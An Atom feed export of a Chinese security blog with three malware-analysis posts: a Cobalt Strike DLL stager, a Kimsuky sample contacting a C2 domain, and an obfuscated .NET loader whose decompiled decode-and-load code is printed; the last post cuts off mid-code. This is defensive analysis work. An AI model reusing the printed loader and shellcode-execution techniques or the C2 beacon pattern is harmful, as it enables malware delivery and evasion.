<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2021-04-27T15:45:24.750Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Cobalt Strike的DLL Stager分析</title>
    <link href="http://422926799.github.io/posts/78291ddc.html"/>
    <id>http://422926799.github.io/posts/78291ddc.html</id>
    <published>2021-04-27T15:40:18.000Z</published>
    <updated>2021-04-27T15:45:24.750Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/" target="_blank" rel="noopener">https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>cs生成分阶段的dll x64位，丢进IDA分析<br><img src="https://z3.ax1x.com/2021/04/27/gCfujJ.png" alt=""></p><p>DllMain函数:<br>1.CreateThread启动线程调用sub_6BAC16B0函数<br>2.调用sub_6BAC15B2函数<br><img src="https://z3.ax1x.com/2021/04/27/gCfQBR.png" alt=""></p><p>sub_6BAC16B0函数:<br>1.将WInMain函数的dll句柄传入到sub_6BAC1605函数执行<br><img src="https://z3.ax1x.com/2021/04/27/gCflH1.png" alt=""></p><p>sub_6BAC1605函数:<br>1.系统启动以来经过的毫秒数*0x26AA<br>2.拼接获取管道名 -&gt; \.\pipe\MSSE-%d-server （例如：\.\pipe\MSSE-1234-server）。该管道的格式是有据可查的“钴罢工”危害指标<br>3.CreateThread启动线程调用调用StartAddress函数<br><img src="https://z3.ax1x.com/2021/04/27/gCf8N6.png" alt=""></p><p>StartAddress函数:<br>1.调用sub_6BAC1440函数,传入一个指针和nNumberOfBytesToRead变量<br><img src="https://z3.ax1x.com/2021/04/27/gCfG4K.png" alt=""></p><p>sub_6BAC1440函数:<br>1.CreateNamedPipeA创建管道<br>2.ConnectNamedPipe连接管道<br>3.连接成功，WriteFile管道写入shellcode<br>4.CloseHandle关闭句柄（一旦将shellcode写入管道后，先前通过管道打开的句柄就通过闭合CloseHandle。这表明管道的唯一目的是传输加密的Shellcode）<br><img src="https://z3.ax1x.com/2021/04/27/gCfY9O.png" alt=""></p><p>sub_6BAC1512函数:<br>1.读取管道里的shell复制到数组 （一旦管道以只读模式打开，该FillBufferFromPipe函数将继续在shellcode上进行复制，直到使用填充分配的缓冲区ReadFile。缓冲区填满后，将关闭命名管道的句柄CloseHandle并FillBufferFromPipe返回TRUE）<br><img src="https://z3.ax1x.com/2021/04/27/gCft3D.png" alt=""></p><p>sub_6BAC176E函数:<br>1.使用VirtualAlloc更改内存区域权限(MEM_RESERVE|MEM_COMMIT)<br>2.一旦分配了区域，该函数就会在shellcode缓冲区上循环并使用简单的xor操作将每个字节解密到新分配的区域中<br>3.调用sub_6BAC1733函数<br>4.VirtualProtect更改区域页面权限为PAGE_EXECUTE_READ<br>5.CreateThread启动线程调用sub_6BAC1730函数<br><img src="https://z3.ax1x.com/2021/04/27/gCfwDA.png" alt=""></p><p>sub_6BAC1733函数:<br>1.根据判断确定将GetModuleHandleA、GetProcAddress函数地址写入内存（数组）<br><img src="https://z3.ax1x.com/2021/04/27/gCfrUP.png" alt=""></p><p>sub_6BAC1730函数:<br>1.shellcode执行<br><img src="https://z3.ax1x.com/2021/04/27/gCfs4f.png" alt=""></p><p>总结：<br>1.创建管道写shellcode<br>2.从管道读取shellcode复制到数组<br>3.更改内存区域权限(MEM_RESERVE|MEM_COMMIT)，xor解密shellcode，将GetModuleHandleA、GetProcAddress函数地址写入内存，更改区域页面权限为PAGE_EXECUTE_READ<br>4.shellcode执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接:&lt;a href=&quot;https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.nviso.e</summary>
      
    
    
    
    
    <category term="恶意" scheme="http://422926799.github.io/tags/恶意/"/>
    
  </entry>
  
  <entry>
    <title>安全客上某样本分析复现</title>
    <link href="http://422926799.github.io/posts/a9492d23.html"/>
    <id>http://422926799.github.io/posts/a9492d23.html</id>
    <published>2021-04-26T05:23:55.000Z</published>
    <updated>2021-04-26T05:43:54.935Z</updated>
    
    <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1480848896&auto=1&height=66"></iframe><p>原文链接:<a href="https://www.anquanke.com/post/id/208525#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208525#h2-1</a><br>样本hash：ae986dd436082fb9a7fec397c8b6e717<br>app.any.run地址：<a href="https://app.any.run/tasks/c5066e3d-974b-499a-971f-954dbf2d5c5d/" target="_blank" rel="noopener">https://app.any.run/tasks/c5066e3d-974b-499a-971f-954dbf2d5c5d/</a><br><img src="https://z3.ax1x.com/2021/04/26/gS3ai4.png" alt=""></p><h2 id="动态执行分析"><a href="#动态执行分析" class="headerlink" title="动态执行分析"></a>动态执行分析</h2><p>火绒剑动态分析</p><pre><code>* BA_extract_pe 这个动作表示释放PE文* BA_self_copy 表示自我复制* BA_register_autorun 表示应用程序通过注册表将自己写入了开机自启动</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3dJJ.png" alt=""></p><p>网络行为监测<br><img src="https://z3.ax1x.com/2021/04/26/gS3DQ1.png" alt=""></p><p>general-second.org-help.com<br>GET /dl_ex1.png?m=000C292922B0&amp;NOTE=Ni4yIDogOS45fDV8djEuMAo=<br><img src="https://z3.ax1x.com/2021/04/26/gS36eK.png" alt=""></p><p>微步社区查询</p><pre><code>* 属于Kimsukey组织</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3RFe.png" alt=""></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>pestudio查询</p><pre><code>* PE位数:32-bit</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3fWd.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS34SA.png" alt=""></p><p>API恶意行为标记<br><img src="https://z3.ax1x.com/2021/04/26/gS3Iyt.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS3oOP.png" alt=""></p><p>strings查询<br><img src="https://z3.ax1x.com/2021/04/26/gS3Hw8.png" alt=""></p><p>IDA打开分析，可以直接找到入口点</p><pre><code>* 创建互斥体    * 互斥体存在退出* 调用sub_4011E0()函数* 调用sub_403600()函数* 调用sub_401580()函数* 调用sub_401770()函数* 调用sub_402790()函数* 判断szServerName长度是否大于0* CreateThread创建线程调用StartAddress函数* 调用WaitForSingleObject等待执行完成</code></pre><p><img src="https://z3.ax1x.com/2021/04/26/gS3OYQ.png" alt=""></p><p>sub_4011E0函数分析<br><img src="https://z3.ax1x.com/2021/04/26/gS89mV.png" alt=""></p><p>可以发现静态分析，没办法分析出什么<br><img src="https://z3.ax1x.com/2021/04/26/gS8CwT.png" alt=""></p><p>打算动态分析，先关闭ASLR<br><img src="https://z3.ax1x.com/2021/04/26/gS8FkF.png" alt=""></p><p>先在sub_401040函数下断，得到解密结果，发现解密出后是wininet.dll<br><img src="https://z3.ax1x.com/2021/04/26/gS8kY4.png" alt=""></p><p>进入call下断可以看的跟直白<br><img src="https://z3.ax1x.com/2021/04/26/gS8AfJ.png" alt=""></p><p>解密得到所有内容<br><img src="https://z3.ax1x.com/2021/04/26/gS8e61.png" alt=""><br>结论是该函数<strong>解密加载对应的dll和获取对应dll的函数地址</strong></p><p>sub_403600函数分析（<strong>拷贝到数据路径，添加开机自启</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS8MTO.png" alt=""></p><p>sub_401580函数分析（<strong>遍历网络适配器得到IP或者使用硬盘序列号生成随机数</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS81te.png" alt=""></p><p>sub_401770函数分析（<strong>获取系统版本、处理器版本、兼容性版本、v1.0然后base64编码返回</strong>）<br><img src="https://z3.ax1x.com/2021/04/26/gS83fH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8tXt.png" alt=""></p><p>sub_402790函数分析<br><img src="https://z3.ax1x.com/2021/04/26/gS80AS.png" alt=""></p><p>sub_402F30动态跟踪分析<br><img src="https://z3.ax1x.com/2021/04/26/gS8spj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8y1s.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS86cn.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8W7T.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS85h4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8o9J.png" alt=""><br>拼接随机数，请求dl_ex1.png</p><p>请求成功后进入下一步<br><img src="https://z3.ax1x.com/2021/04/26/gS87cR.png" alt=""></p><p>跟踪sub_401AA0函数<br><img src="https://z3.ax1x.com/2021/04/26/gS8LB6.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/26/gS8jAO.png" alt=""></p><p>到后面发现是使用rundll32启动执行<br><img src="https://z3.ax1x.com/2021/04/26/gS8vND.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>某cs读取资源文件样本执行分析</title>
    <link href="http://422926799.github.io/posts/a98e0b02.html"/>
    <id>http://422926799.github.io/posts/a98e0b02.html</id>
    <published>2021-04-14T00:27:03.000Z</published>
    <updated>2021-04-14T00:44:35.778Z</updated>
    
    <content type="html"><![CDATA[<p>继续学习样本分析<br>原YouTube视频分析：<a href="https://www.youtube.com/watch?v=deG_-5opR30" target="_blank" rel="noopener">https://www.youtube.com/watch?v=deG_-5opR30</a><br>样本地址：<a href="https://app.any.run/tasks/6cdbb3ea-a272-47d5-b01e-0a41a1ae16f3/" target="_blank" rel="noopener">https://app.any.run/tasks/6cdbb3ea-a272-47d5-b01e-0a41a1ae16f3/</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>下载下来发现是.NET直接丢Dnspy反编译<br><img src="https://z3.ax1x.com/2021/04/14/cy7O9P.png" alt=""></p><p>跟随入口点<br><img src="https://z3.ax1x.com/2021/04/14/cy7vjS.png" alt=""></p><pre><code class="C#">using System;using System.Windows.Forms;namespace WinFormsFirstOne{    // Token: 0x02000013 RID: 19    internal static class Program    {        // Token: 0x06000096 RID: 150 RVA: 0x000068AA File Offset: 0x00004AAA        [STAThread]        private static void Main()        {            Application.EnableVisualStyles();            Application.SetCompatibleTextRenderingDefault(false); //某些控件上定义的属性设置应用程序范围的默认值            Application.Run(new Form1());        }    }}</code></pre><p>跟随第一个函数EnableVisualStyles<br><img src="https://z3.ax1x.com/2021/04/14/cyHSBQ.png" alt=""></p><p>后续跟踪：</p><pre><code class="C#">public static void EnableVisualStyles(){            string text = null;            new FileIOPermission(PermissionState.None) //申请权限            {                AllFiles = FileIOPermissionAccess.PathDiscovery //访问路径本身中的信息。这有助于保护路径中的敏感信息，例如用户名，以及路径中显示的有关目录结构的信息。此值不授予对路径表示的文件或文件夹的访问权限。            }.Assert(); //调用此方法的代码访问受权限需求保护的资源            try            {                text = typeof(Application).Assembly.Location; //读取的资源文件内容            }            finally            {                CodeAccessPermission.RevertAssert();            }            if (text != null)            {                Application.EnableVisualStylesInternal(text, 101);            }}private static void EnableVisualStylesInternal(string assemblyFileName, int nativeResourceID) //EnableVisualStylesInternal函数翻译启用视觉样式内部{            Application.useVisualStyles = UnsafeNativeMethods.ThemingScope.CreateActivationContext(assemblyFileName, nativeResourceID);}////////////////////////public static bool CreateActivationContext(string dllPath, int nativeResourceManifestID) //native Resource Manifest ID(本机资源清单ID){                Type typeFromHandle = typeof(UnsafeNativeMethods.ThemingScope);                bool result;                lock (typeFromHandle)                {                    if (!UnsafeNativeMethods.ThemingScope.contextCreationSucceeded &amp;&amp; OSFeature.Feature.IsPresent(OSFeature.Themes))                    {                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext = default(UnsafeNativeMethods.ThemingScope.ACTCTX);                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.cbSize = Marshal.SizeOf(typeof(UnsafeNativeMethods.ThemingScope.ACTCTX));                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.lpSource = dllPath;                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.lpResourceName = (IntPtr)nativeResourceManifestID;                        UnsafeNativeMethods.ThemingScope.enableThemingActivationContext.dwFlags = 8U;                        UnsafeNativeMethods.ThemingScope.hActCtx = UnsafeNativeMethods.ThemingScope.CreateActCtx(ref UnsafeNativeMethods.ThemingScope.enableThemingActivationContext); // CreateActCtx函数创建一个激活上下文                        UnsafeNativeMethods.ThemingScope.contextCreationSucceeded = (UnsafeNativeMethods.ThemingScope.hActCtx != new IntPtr(-1));                    }                    result = UnsafeNativeMethods.ThemingScope.contextCreationSucceeded;                }                return result;}</code></pre><p>看完完全不知道真正的东西，返回到入口点查看new From1。发现只是实例化各种窗口的，完全没有有用信息<br><img src="https://z3.ax1x.com/2021/04/14/cyHw4I.png" alt=""></p><p>在一筹莫展的时候，跟着视频走。发现是直接分析资源文件处理函数<br><img src="https://z3.ax1x.com/2021/04/14/cyHD8P.png" alt=""></p><p>跟随到资源文件，可以看到定义的SAS变量<br><img src="https://z3.ax1x.com/2021/04/14/cyHsv8.png" alt=""></p><p>跟随Rate函数（以后找不到函数被使用，可以直接Dnspy对着哪一行右键”分析”）<br><img src="https://z3.ax1x.com/2021/04/14/cyHcDg.png" alt=""></p><p>分析如下：</p><pre><code class="C#">using System;namespace WinFormsFirstOne{    // Token: 0x02000009 RID: 9    internal class Castle    {        // Token: 0x04000032 RID: 50        public static string Ir = &quot;cnJCh&quot;;        // Token: 0x04000033 RID: 51        public static string Iq = &quot;HvXUw&quot;;        // Token: 0x04000034 RID: 52        public static string Le = &quot;Load&quot;;    }}        InvokeMethod = 256,    public static string Select(string s)        {            char[] array = s.ToCharArray();            Array.Reverse(array); //反转数组            return new string(array);        }        // Token: 0x0600006C RID: 108 RVA: 0x00004BD0 File Offset: 0x00002DD0        public string Rate(object[] io)        {            byte[] array = Convert.FromBase64String(FarmDestination.Select(Resources.SAS.Replace(&quot;Quotes_on_Life&quot;, &quot;A&quot;))); //base64解码            Assembly assembly = (Assembly)Type.GetType(&quot;System@@@@@^Reflection@@@@@^Assembly&quot;.Replace(&quot;@@@@@^&quot;, &quot;.&quot;)).InvokeMember(Castle.Le, BindingFlags.InvokeMethod, null, null, new object[]            {                array            }); //调用公开静态函数(加载解码的base64) Assembly assembly = (Assembly)Type.GetType(&quot;System.Reflection.Assembly&quot;).InvokeMember(&quot;Load&quot;,256,null,null,new object[]){array}            MethodInfo o = (MethodInfo)LateBinding.LateGet(assembly.GetType(&quot;Dژ家ycحElj她s.的Fڵ是rn太Wظ&quot;), null, &quot;GetMethod&quot;, new object[]            {                &quot;执ZciGڤjPز&quot;            }, null, null); //获取&quot;Dژ家ycحElj她s.的Fڵ是rn太Wظ&quot;.执ZciGڤjP调用结果            LateBinding.LateGet(o, null, FarmDestination.Select(&quot;ekovnI&quot;), new object[]            {                null,                io            }, null, null);            return &quot;Biara&quot;;        }    }}</code></pre><p>将SAS变量进行base64解码<br>1.将Quotes_on_Life替换为A<br>2.反转base64<br>3.base64解码</p><p><img src="https://z3.ax1x.com/2021/04/14/cyHREj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/14/cyHWUs.png" alt=""></p><p>保存到文件，继续拖到dnspy分析，跟踪调用的 执ZciGڤjPز函数。发现是调用了几个函数后远程加载<br><img src="https://z3.ax1x.com/2021/04/14/cyHf5n.png" alt=""></p><p>跟踪هmyڕDئفTH函数<br>1.获取入口函数程序集所在的文件<br>2.创建一个新的ResourceManager<br>3.返回了个Bitmap<br><img src="https://z3.ax1x.com/2021/04/14/cyH4Cq.png" alt=""></p><p>跟踪بظxئ家g希顾太太Bحه函数<br>（貌似是解密的算法）<br><img src="https://z3.ax1x.com/2021/04/14/cyH580.png" alt=""></p><p>跟踪c商ەڤG首首rءsە函数<br>从gzip流读取数据返回<br><img src="https://z3.ax1x.com/2021/04/14/cyHI2V.png" alt=""></p><p>一般这种情况需要断点Assembly.Load才能获取解密后的结果。然后作者把这个dump出来的文件，直接丢de4dot.exe然后就得到了解密的结果<br><img src="https://z3.ax1x.com/2021/04/14/cyHovT.png" alt=""></p><p>最后确定入口点在（smethod_4函数）：<br><img src="https://z3.ax1x.com/2021/04/14/cyH7KU.png" alt=""></p><pre><code class="C#">using System;using System.Collections.Generic;using System.Drawing;using System.IO;using System.IO.Compression;using System.Reflection;using System.Resources;using System.Text;using System.Threading;namespace ns1{    // Token: 0x02000002 RID: 2    public class GClass0    {        // Token: 0x06000001 RID: 1 RVA: 0x00002064 File Offset: 0x00000264        public static byte[] smethod_0(byte[] byte_0)        {            byte[] result;            using (MemoryStream memoryStream = new MemoryStream(byte_0))            {                byte[] array = new byte[4];                memoryStream.Read(array, 0, 4);                int num = BitConverter.ToInt32(array, 0);                using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))                {                    byte[] array2 = new byte[num];                    gzipStream.Read(array2, 0, num);                    result = array2;                }            }            return result;        }        // Token: 0x06000002 RID: 2 RVA: 0x000020E4 File Offset: 0x000002E4        public static byte[] smethod_1(byte[] byte_0, string string_1) //xor解密        {            byte[] bytes = Encoding.ASCII.GetBytes(string_1); //密钥            int num = (int)(byte_0[byte_0.Length - 1] ^ 112);            byte[] array = new byte[byte_0.Length + 1];            int num2 = 0;            for (int i = 0; i &lt;= byte_0.Length - 1; i++)            {                array[i] = (byte)((int)byte_0[i] ^ num ^ (int)bytes[num2]);                if (num2 == string_1.Length - 1)                {                    num2 = 0;                }                else                {                    num2++;                }            }            Array.Resize&lt;byte&gt;(ref array, byte_0.Length - 1);            return array;        }        // Token: 0x06000003 RID: 3 RVA: 0x00002164 File Offset: 0x00000364        private static byte[] smethod_2(Bitmap bitmap_0)        {            List&lt;byte&gt; list = new List&lt;byte&gt;();            checked            {                int num = bitmap_0.Width - 1;                for (int i = 0; i &lt;= num; i++)                {                    int num2 = bitmap_0.Height - 1;                    for (int j = 0; j &lt;= num2; j++)                    {                        Color pixel = bitmap_0.GetPixel(i, j);                        if (pixel != Color.FromArgb(0, 0, 0, 0))                        {                            list.InsertRange(list.Count, new byte[]                            {                                pixel.R,                                pixel.G,                                pixel.B                            });                        }                    }                }                return list.ToArray();            }        }        // Token: 0x06000004 RID: 4 RVA: 0x00002208 File Offset: 0x00000408        public static Bitmap smethod_3(string string_1, string string_2)        {            ResourceManager resourceManager = new ResourceManager(string_2 + &quot;.Properties.Resources&quot;, Assembly.GetEntryAssembly());            return (Bitmap)resourceManager.GetObject(string_1);        }        // Token: 0x06000005 RID: 5 RVA: 0x0000223C File Offset: 0x0000043C        public static void smethod_4(string string_1, string string_2, string string_3)        {            Thread.Sleep(38000);            byte[] rawAssembly = GClass0.smethod_0(GClass0.smethod_1(GClass0.smethod_2(GClass0.smethod_3(string_1, string_3)), string_2));            Assembly.Load(rawAssembly).EntryPoint.Invoke(0, null);            Environment.Exit(0);        }        // Token: 0x04000001 RID: 1        private string string_0 = &quot;You will face many defeats in life, but never let yourself be defeated.&quot;;    }}</code></pre><p>由于加密太多，过于繁琐。无法看到源代码静态分析执行了什么。只能丢沙箱了看看执行了什么，或者在运行的时候dump .NET内存<br>（最后是释放了个exe在执行）<br>作者使用了MegaDumper工具在运行的时候dump下来的exe：<a href="https://github.com/CodeCracker-Tools/MegaDumper" target="_blank" rel="noopener">https://github.com/CodeCracker-Tools/MegaDumper</a><br><img src="https://z3.ax1x.com/2021/04/14/cybCrD.png" alt=""></p><p>最后丢dnspy得到原始的代码</p><pre><code class="C#">using System;using System.EnterpriseServices;using System.Globalization;using System.IO;using System.Reflection;using System.Runtime.InteropServices;using System.Runtime.Remoting;using System.Text;using System.Threading;// Token: 0x02000003 RID: 3[ComVisible(false)]public class RegSvcs{    // Token: 0x06000005 RID: 5    [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)]    private static extern int SearchPath(string path, string fileName, string extension, int numBufferChars, StringBuilder buffer, int[] filePart);    // Token: 0x06000007 RID: 7 RVA: 0x0000209C File Offset: 0x0000029C    private static RegistrationHelper GetRegistrationHelper(bool bCreateAppDomain, out AppDomain domain)    {        RegistrationHelper result = null;        domain = null;        if (!bCreateAppDomain)        {            result = new RegistrationHelper();        }        else        {            string directoryName = Path.GetDirectoryName(RegSvcs.regConfig.AssemblyFile);            domain = AppDomain.CreateDomain(&quot;RegSvcs&quot;, null, new AppDomainSetup            {                ApplicationBase = directoryName            });            if (domain != null)            {                ObjectHandle objectHandle = domain.CreateInstance(typeof(RegistrationHelper).Assembly.FullName, typeof(RegistrationHelper).FullName);                if (objectHandle != null)                {                    result = (RegistrationHelper)objectHandle.Unwrap();                }            }        }        return result;    }    // Token: 0x06000008 RID: 8 RVA: 0x00002124 File Offset: 0x00000324    private static string FindAssembly(string name)    {        StringBuilder stringBuilder = new StringBuilder(261);        if (RegSvcs.SearchPath(null, name, null, stringBuilder.Capacity + 1, stringBuilder, null) == 0)        {            return null;        }        return stringBuilder.ToString();    }    // Token: 0x06000009 RID: 9 RVA: 0x00002158 File Offset: 0x00000358    private static bool IsAssemblyInGAC(string name)    {        try        {            Assembly assembly = Assembly.Load(name);        }        catch        {            return false;        }        return true;    }    // Token: 0x0600000A RID: 10 RVA: 0x00002188 File Offset: 0x00000388    [MTAThread]    public static int Main(string[] args)    {        int result;        try        {            result = RegSvcs.UnsafeMain(args);        }        catch        {            result = 1;        }        return result;    }    // Token: 0x0600000B RID: 11 RVA: 0x000021B4 File Offset: 0x000003B4    public static int UnsafeMain(string[] args)    {        AppDomain appDomain = null;        RegSvcs.DoConsoleInitialization();        try        {            RegSvcs.ParseArguments(args); //根据命令行做出对应的函数处理            if (RegSvcs.logoOutput)            {                RegSvcs.PrintLogo();            }            if (RegSvcs.regConfig.AssemblyFile != null)            {                string text = RegSvcs.FindAssembly(RegSvcs.regConfig.AssemblyFile);                RegistrationHelper registrationHelper;                if (text != null)                {                    RegSvcs.regConfig.AssemblyFile = text;                    registrationHelper = RegSvcs.GetRegistrationHelper(true, out appDomain);                }                else                {                    if (!RegSvcs.IsAssemblyInGAC(RegSvcs.regConfig.AssemblyFile))                    {                        throw new RegistrationException(Resource.FormatString(&quot;RegSvcs_AssemblyNotFound&quot;, RegSvcs.regConfig.AssemblyFile));                    }                    registrationHelper = RegSvcs.GetRegistrationHelper(false, out appDomain);                }                if (RegSvcs.uninstallApplication)                {                    registrationHelper.UninstallAssemblyFromConfig(ref RegSvcs.regConfig);                    if (RegSvcs.successOutput)                    {                        Console.WriteLine(Resource.FormatString(&quot;RegSvcs_UninstallSuccess&quot;, RegSvcs.regConfig.AssemblyFile));                    }                }                else                {                    registrationHelper.InstallAssemblyFromConfig(ref RegSvcs.regConfig);                    if (RegSvcs.successOutput)                    {                        if (RegSvcs.regConfig.Partition != null &amp;&amp; RegSvcs.regConfig.Application != null)                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_InstallSuccess2&quot;, new string[]                            {                                RegSvcs.regConfig.AssemblyFile,                                RegSvcs.regConfig.Application,                                RegSvcs.regConfig.Partition,                                RegSvcs.regConfig.TypeLibrary                            }));                        }                        else if (RegSvcs.regConfig.Application != null)                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_InstallSuccess&quot;, RegSvcs.regConfig.AssemblyFile, RegSvcs.regConfig.Application, RegSvcs.regConfig.TypeLibrary));                        }                        else                        {                            Console.WriteLine(Resource.FormatString(&quot;RegSvcs_NoServicedComponents&quot;));                        }                    }                }            }        }        catch (UsageException ex)        {            if (RegSvcs.logoOutput)            {                RegSvcs.PrintLogo();            }            Console.WriteLine(ex.Message);            return ex.ReturnCode;        }        catch (RegistrationException ex2)        {            string msg;            if (RegSvcs.uninstallApplication)            {                msg = Resource.FormatString(&quot;RegSvcs_UninstallError&quot;);            }            else            {                msg = Resource.FormatString(&quot;RegSvcs_InstallError&quot;);            }            RegSvcs.DumpExceptions(msg, ex2, false);            if (ex2.InnerException != null)            {                if (ex2.InnerException is COMException)                {                    COMException ex3 = (COMException)ex2.InnerException;                    if (ex3.ErrorCode != 0)                    {                        return ex3.ErrorCode;                    }                    return 1;                }            }            else if (ex2.ErrorInfo != null)            {                foreach (RegistrationErrorInfo registrationErrorInfo in ex2.ErrorInfo)                {                    if (registrationErrorInfo.ErrorCode != 0)                    {                        return registrationErrorInfo.ErrorCode;                    }                }            }            return 1;        }        catch (COMException ex4)        {            RegSvcs.DumpExceptions(Resource.FormatString(&quot;RegSvcs_CatalogError&quot;), ex4, false);            if (ex4.ErrorCode != 0)            {                return ex4.ErrorCode;            }            return 1;        }        catch (Exception e)        {            RegSvcs.DumpExceptions(Resource.FormatString(&quot;RegSvcs_UnknownError&quot;), e, true);            return 1;        }        finally        {            if (appDomain != null)            {                AppDomain.Unload(appDomain);            }        }        return 0;    }    // Token: 0x0600000C RID: 12 RVA: 0x000024FC File Offset: 0x000006FC    private static void DoConsoleInitialization()    {        Thread.CurrentThread.CurrentUICulture = CultureInfo.CurrentUICulture.GetConsoleFallbackUICulture(); //当默认的图形用户界面区域不合适时，获取适合控制台应用程序的备用用户界面区域        if (Console.OutputEncoding.CodePage != 65001 &amp;&amp; Console.OutputEncoding.CodePage != Thread.CurrentThread.CurrentUICulture.TextInfo.OEMCodePage &amp;&amp; Console.OutputEncoding.CodePage != Thread.CurrentThread.CurrentUICulture.TextInfo.ANSICodePage) //控制台编码不为UTF-8当前线程页面代码不为xxx则设置        {            Thread.CurrentThread.CurrentUICulture = new CultureInfo(&quot;en-US&quot;); //设置区域为en-us        }    }    // Token: 0x0600000D RID: 13 RVA: 0x00002584 File Offset: 0x00000784    private static void DumpExceptions(string msg, Exception e, bool ename)    {        Console.WriteLine(&quot;\n&quot; + msg);        int num = 1;        while (e != null)        {            if (ename || e.Message == null || e.Message.Length == 0)            {                Console.WriteLine(string.Concat(new object[]                {                    num,                    &quot;: &quot;,                    e.GetType().FullName,                    &quot; - &quot;,                    e.Message                }));            }            else            {                Console.WriteLine(num + &quot;: &quot; + e.Message);            }            if (e is RegistrationException)            {                RegistrationErrorInfo[] errorInfo = ((RegistrationException)e).ErrorInfo;                if (errorInfo != null)                {                    foreach (RegistrationErrorInfo registrationErrorInfo in errorInfo)                    {                        if (registrationErrorInfo.MinorRef.ToLower(CultureInfo.InvariantCulture) != &quot;&lt;invalid&gt;&quot;)                        {                            Console.WriteLine(string.Concat(new string[]                            {                                &quot;    &quot;,                                registrationErrorInfo.Name,                                &quot;.&quot;,                                registrationErrorInfo.MinorRef,                                &quot;: &quot;,                                registrationErrorInfo.ErrorString                            }));                        }                        else                        {                            Console.WriteLine(&quot;    &quot; + registrationErrorInfo.Name + &quot;: &quot; + registrationErrorInfo.ErrorString);                        }                    }                }            }            num++;            e = e.InnerException;        }    }    // Token: 0x0600000E RID: 14 RVA: 0x000026EE File Offset: 0x000008EE    private static void PrintLogo()    {        Console.WriteLine(Resource.FormatString(&quot;RegSvcs_CopyrightMsg&quot;, &quot;4.7.3062.0&quot;, CommonResStrings.CopyrightForCmdLine));    }    // Token: 0x0600000F RID: 15 RVA: 0x0000270C File Offset: 0x0000090C    private static bool IsArgument(string arg, string check)    {        string b = arg.ToLower(CultureInfo.InvariantCulture);        return &quot;/&quot; + check == b || &quot;-&quot; + check == b;    }    // Token: 0x06000010 RID: 16 RVA: 0x0000274C File Offset: 0x0000094C    private static bool IsPrefixArgument(string arg, string check, ref string prefix)    {        string text = arg.ToLower(CultureInfo.InvariantCulture);        prefix = null;        if (arg.StartsWith(&quot;/&quot; + check + &quot;:&quot;, StringComparison.Ordinal) || arg.StartsWith(&quot;-&quot; + check + &quot;:&quot;, StringComparison.Ordinal))        {            if (arg.Length &gt; check.Length + 2)            {                prefix = arg.Substring(check.Length + 2);            }            return true;        }        return RegSvcs.IsArgument(arg, check);    }    // Token: 0x06000011 RID: 17 RVA: 0x000027C4 File Offset: 0x000009C4    private static void ParseArguments(string[] args) //根据命令行参数做出对应的函数处理    {        RegSvcs.regConfig.InstallationFlags = (InstallationFlags.FindOrCreateTargetApplication | InstallationFlags.ReconfigureExistingApplication | InstallationFlags.ReportWarningsToConsole);        RegSvcs.logoOutput = true;        RegSvcs.successOutput = true;        RegSvcs.uninstallApplication = false;        if (args.Length &lt; 1)        {            throw new UsageException(0);        }        int i;        for (i = 0; i &lt; args.Length; i++)        {            string text = null;            if (RegSvcs.IsArgument(args[i], &quot;?&quot;) || RegSvcs.IsArgument(args[i], &quot;help&quot;))            {                throw new UsageException(0);            }            if (RegSvcs.IsArgument(args[i], &quot;c&quot;))            {                RegSvcs.regConfig.InstallationFlags |= InstallationFlags.CreateTargetApplication;                RegSvcs.regConfig.InstallationFlags &amp;= ~InstallationFlags.FindOrCreateTargetApplication;            }            else if (RegSvcs.IsArgument(args[i], 